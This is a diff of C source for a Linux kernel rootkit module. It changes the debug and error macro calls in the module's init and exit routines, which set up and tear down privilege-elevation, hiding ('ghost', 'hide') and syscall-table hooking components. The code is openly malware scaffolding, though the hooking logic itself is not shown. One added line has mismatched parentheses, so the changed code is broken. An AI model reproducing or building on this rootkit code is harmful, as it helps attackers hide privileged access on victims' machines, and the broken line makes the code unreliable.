@@ -25,31 +25,31 @@ static void __exit rootkit_exit(void) {
   int retval;
 
 #ifdef DEBUG
-  ROOTKIT_DEBUG("rootkit_exit()");
+  ROOTKIT_DEBUG(("rootkit_exit()"));
 #endif
   retval = elevate_exit();
 
 #ifdef DEBUG
   if (retval)
-    ROOTKIT_ERROR("elevate_exit() -> %d\n", retval);
+    ROOTKIT_ERROR(("elevate_exit() -> %d\n", retval));
 #endif
   retval = ghost_exit();
   
 #ifdef DEBUG
   if (retval)
-    ROOTKIT_ERROR("ghost_exit() -> %d\n", retval);
+    ROOTKIT_ERROR(("ghost_exit() -> %d\n", retval));
 #endif
   retval = hide_exit();
 
 #ifdef DEBUG
   if (retval)
-    ROOTKIT_ERROR("hide_exit() -> %d\n", retval);
+    ROOTKIT_ERROR(("hide_exit() -> %d\n", retval));
 #endif
   retval = iface_exit();
   
 #ifdef DEBUG
   if (retval)
-    ROOTKIT_ERROR("iface_exit() -> %d\n", retval);
+    ROOTKIT_ERROR(("iface_exit() -> %d\n", retval));
 #endif
 
   /* remove all remaining hooks */
@@ -58,7 +58,7 @@ static void __exit rootkit_exit(void) {
 
 #ifdef DEBUG
   if (retval)
-    ROOTKIT_ERROR("sctm_cleanup(&rootkit__sctm) -> %d\n", retval);
+    ROOTKIT_ERROR(("sctm_cleanup(&rootkit__sctm) -> %d\n", retval));
 #endif
 }
 
@@ -66,14 +66,14 @@ static int __init rootkit_init(void) {
   int retval;
 
 #ifdef DEBUG
-  ROOTKIT_DEBUG("rootkit_init()");
+  ROOTKIT_DEBUG(("rootkit_init())");
 #endif
   
   retval = sctm_init(&rootkit__sctm);
   
   if (retval) {
 #ifdef DEBUG
-    ROOTKIT_ERROR("sctm_init(&rootkit__sctm) -> %d\n", retval);
+    ROOTKIT_ERROR(("sctm_init(&rootkit__sctm) -> %d\n", retval));
 #endif
     return retval;
   }
@@ -81,7 +81,7 @@ static int __init rootkit_init(void) {
 
   if (retval) {
 #ifdef DEBUG
-    ROOTKIT_ERROR("elevate_init(&rootkit__sctm) -> %d\n", retval);
+    ROOTKIT_ERROR(("elevate_init(&rootkit__sctm) -> %d\n", retval));
 #endif
     return retval;
   }
@@ -89,7 +89,7 @@ static int __init rootkit_init(void) {
   
   if (retval) {
 #ifdef DEBUG
-    ROOTKIT_ERROR("ghost_init(&rootkit__sctm) -> %d\n", retval);
+    ROOTKIT_ERROR(("ghost_init(&rootkit__sctm) -> %d\n", retval));
 #endif
     return retval;
   }
@@ -97,7 +97,7 @@ static int __init rootkit_init(void) {
 
   if (retval) {
 #ifdef DEBUG
-    ROOTKIT_ERROR("hide_init(&rootkit__sctm) -> %d\n", retval);
+    ROOTKIT_ERROR(("hide_init(&rootkit__sctm) -> %d\n", retval));
 #endif
     return retval;
   }
@@ -105,7 +105,7 @@ static int __init rootkit_init(void) {
   
 #ifdef DEBUG
   if (retval)
-    ROOTKIT_ERROR("iface_init(&rootkit__sctm) -> %d\n", retval);
+    ROOTKIT_ERROR(("iface_init(&rootkit__sctm) -> %d\n", retval));
 #endif
   return retval;
 }
